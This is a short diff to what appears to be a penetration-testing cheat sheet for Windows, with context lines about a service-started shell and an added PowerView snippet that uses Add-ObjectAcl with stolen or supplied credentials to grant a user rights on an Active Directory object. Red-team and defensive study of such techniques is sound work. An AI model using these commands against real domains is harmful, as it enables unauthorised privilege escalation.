@@ -134,3 +134,9 @@ sc.exe start servicename
 WARNING: The above shell is unstable and will probably die after seconds.
 Use meterpreter instead.
 ```
+
+Grant Domain User Privs via PowerView
+```
+. .\PowerView.ps1
+add-objectacl -principalidentity username -credential $cred -rights privname
+```
